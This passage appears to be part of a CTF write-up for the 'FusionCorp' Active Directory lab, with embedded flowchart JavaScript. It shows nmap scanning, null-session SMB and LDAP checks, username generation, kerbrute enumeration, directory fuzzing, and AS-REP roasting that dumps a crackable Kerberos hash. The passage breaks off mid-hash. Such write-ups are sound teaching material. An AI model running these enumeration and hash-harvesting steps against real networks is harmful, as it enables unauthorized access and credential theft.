+.node-root .flowchart-icon { color: #FFD700; }  
+.node-default .flowchart-icon { color: #A9A9A9; }  
+</style>
+
+<script>
+(function() {
+  
+  "use strict";
+
+  let flowchartInstances = {};
+
+  const iconMap = {
+    recon: '\uf002', enum: '\uf0ca', exploit: '\uf1e2',
+    access: '\uf084', privesc: '\uf21b', root: '\uf624', default: '\uf059',
+    pin: '\uf08d',
+  };
+
+  function initFlowcharts() {
+    const containers = document.querySelectorAll('.attack-path-flowchart');
+    containers.forEach(container => {
+      if (container.dataset.initialized) return;
+      container.dataset.initialized = 'true';
+
+      const id = container.id;
+      const dataDiv = container.querySelector('.flowchart-data');
+      if (dataDiv) {
+        const steps = parseSteps(dataDiv.textContent);
+        if (steps.length > 0) {
+          flowchartInstances[id] = createInteractiveFlowchart(container, steps);
+          setupControls(container, id);
+        }
+      }
+    });
+  }
+
+  function setupControls(container, id) {
+    const instance = flowchartInstances[id];
+    if (!instance) return;
+    container.querySelectorAll('.zoom-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const action = btn.getAttribute('data-action');
+        if (action === 'zoom-in') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);
+        } else if (action === 'zoom-out') {
+            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);
+        } else if (action === 'reset') {
+          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);
+        }
+      });
+    });
+  }
+
+  function parseSteps(content) {
+    return content.split('\n').map(l => l.trim()).filter(Boolean).map((line, idx) => {
+      line = line.replace(/^[-*]\s*/, '');
+      const imgRe = /\[\s*([^\]]+?)\s*\]\s*(.*)/;
+      const match = line.match(imgRe);
+      const text = match ? match[2].trim() : line;
+      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };
+    });
+  }
+
+  function getStepType(text) {
+    const l = text.toLowerCase();
+    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';
+    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';
+    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';
+    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';
+    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';
+    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';
+    return 'default';
+  }
+
+  function createInteractiveFlowchart(container, nodesData) {
+    const W = container.clientWidth, H = container.clientHeight;
+    const svg = d3.select(container).append('svg')
+                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);
+
+    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e => g.attr('transform', e.transform));
+
+    svg.call(zoom);
+    const g = svg.append('g');
+
+    const defs = svg.append('defs');
+    defs.append('marker')
+        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')
+        .attr('refX', 25).attr('refY', 0)
+        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)
+      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');
+
+    const links = nodesData.length > 1 ? d3.range(nodesData.length - 1).map(i => ({ source: nodesData[i], target: nodesData[i+1] })) : [];
+
+    const arrows = g.append("g").selectAll("line")
+      .data(links).enter().append("line")
+      .attr("class", "flowchart-arrow")
+      .attr("marker-end", "url(#arrowhead)");
+
+    const nodeGroups = g.append("g").selectAll(".flowchart-node")
+      .data(nodesData, d => d.id).enter().append("g")
+      .attr("class", d => 'flowchart-node node-' + d.type);
+
+    nodeGroups.each(function(d) {
+      const node = d3.select(this);
+      if (d.imageUrl) {
+        node.append('image')
+          .attr('href', d.imageUrl).attr('class', 'flowchart-image')
+          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)
+          .on('error', function() {
+            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);
+            d3.select(this).remove();
+          });
+      } else {
+        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);
+      }
+    });
+
+    nodeGroups.append('text')
+      .attr('class', 'flowchart-pin-icon')
+      .attr('x', 20)
+      .attr('y', -20)
+      .text(iconMap.pin);
+
+    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)
+      .each(function(d) { wrapText(d3.select(this), d.text, 100); });
+    nodeGroups.append('title').text(d => d.text);
+
+    const numNodes = nodesData.length;
+    const padding = 120;
+    const nodeRadius = 40;
+
+    const linkForce = d3.forceLink(links).id(d => d.id).distance(150).strength(0.2);
+
+    const simulation = d3.forceSimulation(nodesData)
+        .force("link", linkForce)
+        .force("charge", d3.forceManyBody().strength(-600))
+        .force("collide", d3.forceCollide().radius(nodeRadius).strength(1))
+        .force("x", d3.forceX(d => {
+            if (numNodes <= 1) return W / 2;
+            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);
+        }).strength(0.4))
+        .force("y", d3.forceY(d => {
+            if (numNodes <= 1) return H / 2;
+            const amplitude = H * 0.20;
+            const frequency = Math.PI;
+            const centerY = H / 2;
+            const phase = (d.id / (numNodes - 1)) * frequency;
+            return centerY - amplitude * Math.cos(phase);
+        }).strength(0.5))
+        .on("tick", () => {
+          arrows
+              .attr("x1", d => d.source.x)
+              .attr("y1", d => d.source.y)
+              .attr("x2", d => d.target.x)
+              .attr("y2", d => d.target.y);
+          nodeGroups
+              .attr("transform", d => `translate(${d.x},${d.y})`);
+        });
+
+    const dragHandler = d3.drag()
+        .on("start", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0.3).restart();
+            d.fx = d.x;
+            d.fy = d.y;
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', true);
+            linkForce.strength(0); 
+        })
+        .on("drag", function (event, d) {
+            d.fx = event.x;
+            d.fy = event.y;
+        })
+        .on("end", function (event, d) {
+            if (!event.active) simulation.alphaTarget(0);
+            
+            linkForce.strength(0.2); 
+            
+            arrows.filter(link => link.source.id === d.id).classed('glow', false);
+
+            d.pinned = true;
+            d3.select(this).select('.flowchart-pin-icon').style('display', 'block');
+        });
+
+    nodeGroups
+      .call(dragHandler)
+      .on('mouseover', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', true);
+      })
+      .on('mouseout', (event, d) => {
+        
+        arrows.filter(link => link.source.id === d.id).classed('glow', false);
+      })
+      .on('contextmenu', function(event, d) {
+        event.preventDefault();
+        
+        if (d.pinned) {
+          d.pinned = false;
+          d.fx = null; 
+          d.fy = null;
+          d3.select(this).select('.flowchart-pin-icon').style('display', 'none');
+          simulation.alpha(0.3).restart(); 
+        }
+      });
+
+    return { svg, zoom, g };
+  }
+
+  function wrapText(textElem, str, maxW) {
+    const words = str.split(/\s+/), lineHeight = 12, x = 0;
+    textElem.text(null);
+    let line = [], tspan = textElem.append('tspan').attr('x', x);
+    for (const word of words) {
+        line.push(word);
+        tspan.text(line.join(' '));
+        if (tspan.node().getComputedTextLength() > maxW && line.length > 1) {
+            line.pop();
+            tspan.text(line.join(' '));
+            line = [word];
+            tspan = textElem.append('tspan').attr('x', x).attr('dy', `${lineHeight}px`).text(word);
+        }
+    }
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initFlowcharts);
+  } else {
+    initFlowcharts();
+  }
+})();
+</script>
+
+<hr>
+<h1 id="1-reconnaissance-ta0043">1. Reconnaissance (TA0043)<a hidden class="anchor" aria-hidden="true" href="#1-reconnaissance-ta0043">#</a></h1>
+<h3 id="11-network-scanning-t1595">1.1. Network Scanning (T1595)<a hidden class="anchor" aria-hidden="true" href="#11-network-scanning-t1595">#</a></h3>
+<p>As always, we kick things off with an <code>nmap</code> scan to see what we’re up against.
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">sudo</span> nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/fusioncorp 10.10.114.232 <span class="flag">-vv</span> 
+# Nmap 7.95 scan initiated Thu Jul 10 16:24:00 2025 as: /usr/lib/nmap/nmap <span class="flag">-sVC</span> <span class="flag">-oA</span> nmap/fusioncorp <span class="flag">-vv</span> 10.10.114.232
+Nmap scan report for 10.10.114.232
+Host is up, received echo-reply ttl 125 (0.15s latency).
+Scanned at 2025-07-10 16:24:01 EDT for 69s
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus
+80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
+|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: eBusiness Bootstrap Template
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-10 20:24:17Z)
+135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack ttl 125
+464/tcp  open  kpasswd5?     syn-ack ttl 125
+593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack ttl 125
+3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped    syn-ack ttl 125
+3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: FUSION
+|   NetBIOS_Domain_Name: FUSION
+|   NetBIOS_Computer_Name: FUSION-DC
+|   DNS_Domain_Name: fusion.corp
+|   DNS_Computer_Name: Fusion-DC.fusion.corp
+|   Product_Version: 10.0.17763
+|_  System_Time: 2025-07-10T20:24:27+00:00
+| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
+| Issuer: commonName=Fusion-DC.fusion.corp
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-07-09T20:23:17
+| Not valid after:  2026-01-08T20:23:17
+| MD5:   9bb5:816c:19a4:ded2:25ce:fadf:aa7c:6862
+| SHA-1: 97a5:6d31:335b:799f:32c3:ca9b:4a99:c8c7:8c23:92a5
+| <span class="flag">-----BEGIN</span> CERTIFICATE-----
+| MIIC7jCCAdagAwIBAgIQcRL/M8rGsoBMcOvpYGK3CTANBgkqhkiG9w0BAQsFADAg
+| MR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNvcnAwHhcNMjUwNzA5MjAyMzE3
+| WhcNMjYwMTA4MjAyMzE3WjAgMR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNv
+| cnAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDpAnEjtv/u25XgKvVm
+| I9NWSgdwdJLwtgC9oLMZQcEwhZ2hWNYMhHsaf7JC1NYxUW4k5wf2bpsCkx7hLZs2
+| aaVGnAjNoBMznkfIu/goDkkFRA7IwW7vzFOs6Wqc+sxRYcJvcZWaq/hXtUoam85l
+| TNhYUFrfjATkhgPpqGKUi0WBVqfw/Gcdt3KIlvTAauY3q2Ft6YtL+A4S+QgEYF6N
+| qMnJ2kODWuCKRwqqUEX6d4/DTUXoAQIgGZzudi/WYVOkg39dd2LT0DS7wiRZydr5
+| XGr9+ge71mf9yk5ge6JHEdFgEJayAukksHtK97tziuoLmCANLt7b+bZL++1VpFCu
+| 6LJhAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
+| BgkqhkiG9w0BAQsFAAOCAQEAKZv4p8/eX82nKg7TCL9N5XfJ44BpBtPIHqghEYS+
+| FxzjdKVUgxbdod8Rb6Wqoq6f3lw81mYhG3vixEkcQmEtp10gScWbdScTV+EB0J2C
+| bZCUBZus8m4HdD+BGbWW61/k6iF0hdTJUvvb3kyWn4Ed6Y79bvXkKjuEmEgvJcmD
+| iFjmhQYH+eMrwaWPCsSLYcHAzh9OoVQZHx5n7HNNAb2rvFBywUYTS7StQQZTl3v0
+| CaMeZlmiyOvzxqjsrE/CkVA3Xgk04P7vrlv0Vqn3Ka29FpdVuluLQMN64OpnYVEA
+| XLC+kuRLfSVxyBK4z64aNa/MDvCKv2m58U4kzXo/DSZqAw==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2025-07-10T20:25:06+00:00; 0s from scanner time.
+Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 14125/tcp): CLEAN (Timeout)
+|   Check 2 (port 14414/tcp): CLEAN (Timeout)
+|   Check 3 (port 42015/udp): CLEAN (Timeout)
+|   Check 4 (port 12722/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-time: 
+|   date: 2025-07-10T20:24:27
+|_  start_date: N/A
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul 10 16:25:10 2025 <span class="flag">--</span> 1 IP address (1 host up) scanned in 69.56 seconds
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>The scan reveals common ports for an Active Directory environment. The <code>rdp-ntlm-info</code> NSE script gives us the domain name (<code>fusion.corp</code>), the hostname (<code>FUSION-DC</code>), and the FQDN (<code>Fusion-DC.fusion.corp</code>). Port 80 is also open.</p>
+<p>Let&rsquo;s add that to our hosts file:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">echo</span> <span class="string">"10.10.27.194 Fusion-DC.fusion.corp FUSION-DC fusion.corp"</span> | sudo tee <span class="flag">-a</span> /etc/hosts
+10.10.27.194 Fusion-DC.fusion.corp FUSION-DC fusion.corp
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+
+<style>
+  .callout {
+    display: flex;
+    padding: 1rem;
+    margin: 1.5rem 0;
+    border-left: 5px solid;
+    border-radius: 0.5rem;
+    background-color: var(--code-bg); 
+  }
+
+  .callout-icon {
+    flex-shrink: 0;
+    margin-right: 1rem;
+    width: 1.5em; 
+    height: 1.5em;
+  }
+
+  .callout-content {
+    flex-grow: 1;
+    font-size: 0.95em;
+    line-height: 1.6;
+  }
+
+  .callout-content > *:first-child {
+    margin-top: 0;
+  }
+  .callout-content > *:last-child {
+    margin-bottom: 0;
+  }
+
+
+  .callout.callout-default {
+    border-color: #4a90e2; 
+    background-color: rgba(74, 144, 226, 0.1);
+  }
+  .callout.callout-default .callout-icon {
+    color: #4a90e2;
+  }
+
+  .callout.callout-info {
+    border-color: #50e3c2; 
+    background-color: rgba(80, 227, 194, 0.1);
+  }
+  .callout.callout-info .callout-icon {
+    color: #50e3c2;
+  }
+
+  .callout.callout-warning {
+    border-color: #f5a623; 
+    background-color: rgba(245, 166, 35, 0.1);
+  }
+  .callout.callout-warning .callout-icon {
+    color: #f5a623;
+  }
+
+  .callout.callout-error {
+    border-color: #d0021b; 
+    background-color: rgba(208, 2, 27, 0.1);
+  }
+  .callout.callout-error .callout-icon {
+    color: #d0021b;
+  }
+</style><div class="callout callout-warning">
+  <div class="callout-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+  </div>
+  <div class="callout-content">
+    <strong>Note:</strong>
+    You should put the FQDN first before anything else, to avoid any DNS issues. (That&rsquo;s what I learn on the previous writeup Crocc Crew)
+  </div>
+</div>
+
+<h3 id="12-anonymous-authentication-checks">1.2. Anonymous Authentication Checks<a hidden class="anchor" aria-hidden="true" href="#12-anonymous-authentication-checks">#</a></h3>
+<p>Without credentials, we can&rsquo;t do anything. So let&rsquo;s try basic unauthenticated checks first before diving into the web stuff. First, I will try smb null authentication:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> smb $target <span class="flag">-u</span> <span class="string">''</span> <span class="flag">-p</span> <span class="string">''</span> <span class="flag">--shares</span>
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="indicator-info">[*]</span> Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (<span style="color:red;font-weight:bold">signing:True</span>) (<span style="color:orange;font-weight:bold">SMBv1:False</span>) 
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="indicator-success">[+]</span> fusion.corp\: 
+<span class="smb">SMB</span>         10.10.27.194    445    FUSION-DC        <span class="indicator-error">[-]</span> Error enumerating shares: STATUS_ACCESS_DENIED
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>We can authenticate but we can&rsquo;t list the shares. Next, I&rsquo;ll try an anonymous bind against LDAP to see if I can dump any information about the domain structure:</p>
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-s</span> base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=fusion,DC=corp
+namingcontexts: CN=Configuration,DC=fusion,DC=corp
+namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp
+namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp
+namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">ldapsearch</span> <span class="flag">-x</span> <span class="flag">-H</span> ldap://$target <span class="flag">-b</span> <span class="string">'DC=fusion,DC=corp'</span>
+# extended LDIF
+#
+# LDAPv3
+# base <DC=fusion,DC=corp> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v4563
+
+# numResponses: 1
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>LDAP reveals naming contexts but deeper access requires valid credentials.</p>
+<p>Next, I&rsquo;ll check if RDP needs Network Level Authentication (NLA) with netexec:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">nxc</span> rdp $target <span class="flag">-u</span> <span class="string">''</span> <span class="flag">-p</span> <span class="string">''</span>                                             
+RDP         10.10.27.194    3389   FUSION-DC        <span class="indicator-info">[*]</span> Windows 10 or Windows Server 2016 Build 17763 (name:FUSION-DC) (domain:fusion.corp) (<span style="color:cyan;font-weight:bold">nla:True</span>)
+RDP         10.10.27.194    3389   FUSION-DC        <span class="indicator-error">[-]</span> fusion.corp\: (STATUS_LOGON_FAILURE)
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>It does. This means we can&rsquo;t force the client side to turn it off just to see the login screen.</p>
+<hr>
+<h1 id="2-initial-access-ta0001">2. Initial Access (TA0001)<a hidden class="anchor" aria-hidden="true" href="#2-initial-access-ta0001">#</a></h1>
+<h3 id="21-web-enumeration-and-user-discovery-t1593">2.1. Web Enumeration and User Discovery (T1593)<a hidden class="anchor" aria-hidden="true" href="#21-web-enumeration-and-user-discovery-t1593">#</a></h3>
+<p>Since we can&rsquo;t do anything else, let&rsquo;s dive in to the website. First thing I notice is that the website is just a static page.</p>
+<p>But I saw some names on the website so let&rsquo;s grab these in case they&rsquo;re domain users:</p>
+<img src="/img/FusionCorp/users.png" alt="" class="img-responsive" loading="lazy" />
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">curl</span> <span class="flag">-s</span> http://10.10.27.194/ | <span style="color:#15adff">pup</span> <span class="string">'div.team-content h4 text{}'</span> | <span style="color:#15adff">tee</span> users.txt
+Jhon Mickel
+Andrew Arnold
+Lellien Linda
+Jhon Powel
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+
+<p>Now that we have some names, let&rsquo;s use <a href="https://github.com/urbanadventurer/username-anarchy" title="null">username-anarchy</a> to generate a list of potential usernames:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">/opt/username-anarchy/username-anarchy</span> <span class="flag">-i</span> users.txt | <span style="color:#15adff">tee</span> pot-users.txt
+jhon
+jhonmickel
+jhon.mickel
+jhonmick
+jhonm
+j.mickel
+jmickel
+mjhon
+m.jhon
+mickelj
+...SNIP...
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>With these generated usernames, we can use kerbrute to see if any are valid domain users:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">kerbrute</span> userenum <span class="flag">-d</span> fusion.corp <span class="flag">--dc</span> Fusion-DC.fusion.corp pot-users.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 07/10/25 - Ronnie Flathers @ropnop
+
+2025/07/10 22:09:16 >  Using KDC(s):
+2025/07/10 22:09:16 >   Fusion-DC.fusion.corp:88
+
+<span style="color:#00ff48">2025/07/10 22:09:17 >  Done! Tested 56 usernames (0 valid) in 0.948 seconds</span>
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>And nothing. Next thing is to fuzz for directories. Since this is a Windows machine, I will use a lowercase wordlist because Windows is not case-sensitive.
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">gobuster</span> dir <span class="flag">-u</span> http://fusion-dc.fusion.corp/ <span class="flag">-w</span> /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+<span class="indicator-success">[+]</span> Url:                     http://fusion-dc.fusion.corp/
+<span class="indicator-success">[+]</span> Method:                  GET
+<span class="indicator-success">[+]</span> Threads:                 10
+<span class="indicator-success">[+]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt
+<span class="indicator-success">[+]</span> Negative Status codes:   404
+<span class="indicator-success">[+]</span> User Agent:              gobuster/3.6
+<span class="indicator-success">[+]</span> Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/js                   (Status: 301) [Size: 155] [--> http://fusion-dc.fusion.corp/js/]
+/css                  (Status: 301) [Size: 156] [--> http://fusion-dc.fusion.corp/css/]
+/img                  (Status: 301) [Size: 156] [--> http://fusion-dc.fusion.corp/img/]
+/lib                  (Status: 301) [Size: 156] [--> http://fusion-dc.fusion.corp/lib/]
+/backup               (Status: 301) [Size: 159] [--> http://fusion-dc.fusion.corp/backup/]
+/.                    (Status: 200) [Size: 53888]
+/contactform          (Status: 301) [Size: 164] [--> http://fusion-dc.fusion.corp/contactform/]
+Progress: 38267 / 38268 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+</code><button class="copy-code">copy</button></pre>
+  </div>
+</div>
+</p>
+<p>We found a <code>/backup/</code> directory, and visiting it we found a <code>.ods</code> file which reveals a list of usernames:</p>
+<img src="/img/FusionCorp/employees.png" alt="" class="img-responsive" loading="lazy" />
+<h3 id="22-as-rep-roasting-t1558004">2.2. AS-REP Roasting (T1558.004)<a hidden class="anchor" aria-hidden="true" href="#22-as-rep-roasting-t1558004">#</a></h3>
+<p>We then validate this new list using kerbrute:
+<div class="terminal-linux">
+  <div class="terminal-header">
+    <div class="window-controls">
+      <span class="dot red"></span>
+      <span class="dot yellow"></span>
+      <span class="dot green"></span>
+    </div>
+    <div class="terminal-title">0xblivion@fusionCorp: ~</div>
+  </div>
+  <div class="terminal-content">
+    <pre><code>
+<span class="prompt-host">root@localhost</span><span class="prompt-colon">:</span><span class="prompt-dir">~</span><span class="prompt-hash"># </span><span class="command">kerbrute</span> userenum <span class="flag">-d</span> fusion.corp <span class="flag">--dc</span> Fusion-DC.fusion.corp usernames.txt <span class="flag">--downgrade</span>
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 07/10/25 - Ronnie Flathers @ropnop
+
+2025/07/10 22:15:02 >  Using downgraded encryption: arcfour-hmac-md5
+2025/07/10 22:15:02 >  Using KDC(s):
+2025/07/10 22:15:02 >   Fusion-DC.fusion.corp:88
+
+<span style="color:#00ff48">2025/07/10 22:15:02 >  <span class="indicator-success">[+]</span> lparker has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$lparker@FUSION.CORP:f0f4f16c94f89609bfdc69a559159100$11281a32c4b718a712c186b24dc7e5cb6f55aaddce9a7f09676fa93033c21e63349048330b7235c0c1e7f5c3ffe9151ad3d2590e2d59fbb34feb338bc31b7d984c467f5d1e8f7dbe977df9f0bc5ac30f87d22dde265d53c2a5f834131699dea979fdeeb289d7ffe9604cdc95a62a6a1a3938f02b7fb60381eaadd4d95d3db518439ec866d66e312af056
